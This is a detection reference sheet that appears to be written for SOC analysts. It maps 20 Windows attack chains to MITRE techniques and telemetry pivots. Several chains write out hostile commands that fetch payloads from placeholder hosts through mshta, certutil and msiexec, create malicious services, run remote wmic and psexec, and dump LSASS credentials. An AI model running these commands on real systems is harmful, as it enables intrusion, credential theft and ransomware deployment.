# FULL ATTACK CHAINS (1–20) — BEHAVIOURAL, LOLBIN, AND FILELESS ATTACKS

Below are 20 high-fidelity, real-world attack chains exactly as they appear in SOC/IR work.
Each chain includes:

- The **exact ASCII ancestry tree**
- **Full payload activity** (download, decode, injection, C2, persistence)
- **MITRE tactics/techniques**
- **Context / reasoning**
- **Telemetry pivots**

---

# Chain 1 — Phishing Doc → Macro → PowerShell Loader → C2
outlook.exe
  └─ winword.exe (macro-enabled doc)
       └─ powershell.exe -enc <base64> (stager)
            └─ payload.exe
                 └─ C2 beaconing
                      └─ credential harvesting


## Context / Reasoning
**Initial Access:** T1566.001  
**Execution:** T1059.001  
**C2:** T1105  

Attackers love this because macros → PowerShell gives full in-memory execution.


## Telemetry Pivots
- DeviceProcessEvents: winword → powershell  
- DeviceNetworkEvents: powershell → external IP  
- DeviceFileEvents: payload drop  
---

# Chain 2 — HTML Smuggling → MSHTA → PowerShell → Payload
chrome.exe / outlook.exe
  └─ mshta.exe http://malicious/payload.hta
       └─ powershell.exe (downloadstring → stager)
            └─ payload.exe
                 └─ C2 traffic
                      └─ registry persistence


## Context / Reasoning
**Execution:** T1218.005  
**C2:** T1105  
**Evasion:** HTML smuggling hides payload inside decoded JS.


## Telemetry Pivots
- mshta parent = browser/Office  
- remote .hta load  
---

# Chain 3 — Script Dropper → WScript → PowerShell → Scheduled Task Persistence
winword.exe
  └─ wscript.exe malicious.vbs
       └─ powershell.exe (stager)
            └─ schtasks.exe /create /tn <task> /tr <payload>
                 └─ payload.exe (task run)
                      └─ C2


## Context / Reasoning
**Persistence:** T1053.005  
**Execution:** T1059.005 / T1059.001  


## Telemetry Pivots
- .vbs/.js parented by Office  
- PS → schtasks  
---

# Chain 4 — MSI Loader → Rundll32 → Payload DLL → C2
browser.exe
  └─ msiexec.exe /i https://host/payload.msi /qn
       └─ rundll32.exe payload.dll,EntryPoint
            └─ payload.exe
                 └─ privilege escalation
                      └─ C2


## Context / Reasoning
**Execution:** T1218.007  
**Defense Evasion:** T1218.011  


## Telemetry Pivots
- msiexec remote download  
- DLL loaded via rundll32  
---

# Chain 5 — Certutil Download → Decode → Execute → C2
powershell.exe / cmd.exe
  └─ certutil.exe -urlcache -split -f http://host/payload.b64
       └─ certutil.exe -decode payload.b64 payload.exe
            └─ payload.exe
                 └─ C2 connection
                      └─ ransomware staging (shadow copy deletion)


## Context
**Ingress Tool Transfer:** T1105  
**Deobfuscation:** T1140  


## Telemetry
- certutil args  
- .b64 → .exe sequence  
---

# Chain 6 — Malicious Service Creation → SYSTEM Execution
dropper.exe
  └─ sc.exe create badsvc binPath="C:\Users\Public\svc.exe" start=auto
       └─ reboot
            └─ services.exe
                 └─ svc.exe (SYSTEM)
                      └─ C2
                           └─ ransomware encryption


## Context
**Persistence:** T1543.003  
**Impact:** T1486  


## Telemetry
- sc create with user paths  
- new service registry key  
---

# Chain 7 — WMI Remote Execution → Lateral Movement
powershell.exe
  └─ wmic.exe /node:target process call create "cmd.exe /c payload.exe"
       └─ target-host: cmd.exe
            └─ payload.exe
                 └─ recon
                      └─ C2


## Context
**Lateral Movement:** T1047  
**Execution:** WMI-based  


## Telemetry
- wmic command  
- remote process creation  
---

# Chain 8 — PsExec Lateral Spread → Payload → Encryption
attacker-host.exe
  └─ psexec.exe \\target -s cmd.exe /c \\share\payload.exe
       └─ target: psexesvc.exe
            └─ cmd.exe /c payload.exe
                 └─ payload.exe
                      └─ file encryption
                           └─ data destruction


## Context
**Lateral Movement:** T1021.002  
**Impact:** T1486  


## Telemetry
- ADMIN$ writes  
- psexesvc.exe creation  
---

# Chain 9 — Fully Fileless Multi-LOLBIN Execution Chain
winword.exe
  └─ wscript.exe malicious.js
       └─ powershell.exe (in-memory loader)
            └─ rundll32.exe (reflective DLL injection)
                 └─ dllhost.exe (injected COM surrogate)
                      └─ C2
                           └─ credential theft


## Context
**Process Injection:** T1055  
**Execution:** multiple LOLBins  


## Telemetry
- ancestry from Word → dllhost  
- network from dllhost  
---

# Chain 10 — DLL Search Order Hijack → Payload
legitimate.exe
  └─ malicious.dll (search order preload)
       └─ payload.exe
            └─ privilege escalation
                 └─ C2


## Context
**Hijacking:** T1574.002  


## Telemetry
- DLL loaded from user paths  
---

# Chain 11 — Browser Exploit → LOLBin → Payload
chrome.exe
  └─ powershell.exe (spawned via shellcode)
       └─ payload.exe
            └─ registry persistence
                 └─ recon
                      └─ C2


## Context
**Exploitation:** T1203  


## Telemetry
- powershell parented by browser  
---

# Chain 12 — ISO/VHD Mount → App.exe → Malicious DLL → Payload
explorer.exe
  └─ app.exe (from mounted ISO/VHD)
       └─ malicious.dll
            └─ payload.exe
                 └─ outbound C2


## Context
**User Execution:** T1204  
**DLL Hijack:** T1574.002  


## Telemetry
- execution from mount paths  
---

# Chain 13 — Malicious LNK → LOLBin → Payload
explorer.exe
  └─ malicious.lnk
       └─ powershell.exe / mshta.exe / wscript.exe
            └─ payload.exe
                 └─ persistence
                      └─ C2


## Context
**User Execution:** LNK concealment  


## Telemetry
- .lnk in command line  
---

# Chain 14 — ZIP Delivery → JS/VBS Script → LOLBin → Payload
explorer.exe
  └─ wscript.exe script.vbs
       └─ powershell.exe
            └─ payload.exe
                 └─ beaconing
                      └─ lateral movement prep


## Context
Very common in malware loaders (AgentTesla, Remcos, Formbook).


## Telemetry
- script engines → LOLBins  
---

# Chain 15 — Browser → CMD → PowerShell → Payload (Drive-By)
browser.exe
  └─ cmd.exe /c (hidden)
       └─ powershell.exe (download/encode)
            └─ payload.exe
                 └─ C2 connection
                      └─ persistence install


## Context
**Execution:** browser spawning CMD is extremely abnormal.


## Telemetry
- browser → cmd → ps chain  
---

# Chain 16 — PowerShell → Rundll32 → DLL Injection → dllhost.exe C2
powershell.exe
  └─ rundll32.exe malicious.dll
       └─ injects into dllhost.exe
            └─ dllhost.exe
                 └─ C2
                      └─ long-term foothold


## Context
COM surrogate abuse → stealthy long-running C2.


## Telemetry
- DLL loads + network from dllhost  
---

# Chain 17 — PowerShell Inline C# → Memory Injection → Beacon
powershell.exe
  └─ Add-Type / Reflection / FromBase64String
       └─ shellcode injection
            └─ in-memory beacon
                 └─ external C2


## Context
No files — pure memory loader.


## Telemetry
- suspicious PS flags  
---

# Chain 18 — RDPClip Abuse → Clipboard Exfiltration
mstsc.exe
  └─ rdpclip.exe
       └─ copies sensitive data
            └─ local sync
                 └─ exfil (indirect)


## Context
**Exfiltration:** T1114  


## Telemetry
- abnormal clipboard behaviour  
---

# Chain 19 — BYOVD → Kernel Manipulation → Payload
dropper.exe
  └─ install vulnerable_driver.sys
       └─ driver disables protections (EDR unhook, callback removal)
            └─ payload.exe
                 └─ ransomware staging (shadow copy delete)
                      └─ C2


## Context
Kernel-level bypass → ransomware launchpad.


## Telemetry
- driver service creation  
- driver load events  
---

# Chain 20 — Credential Dump → LSASS → Exfiltration
powershell.exe / malicious.exe
  └─ read LSASS memory (MiniDump / comsvcs.dll)
       └─ lsass.dmp
            └─ payload.exe
                 └─ HTTP(S) exfiltration
                      └─ lateral movement using stolen creds


## Context
**Credential Access:** T1003  
**Exfil:** T1041  


## Telemetry
- dump file creation  
- remote exfil post-dump  
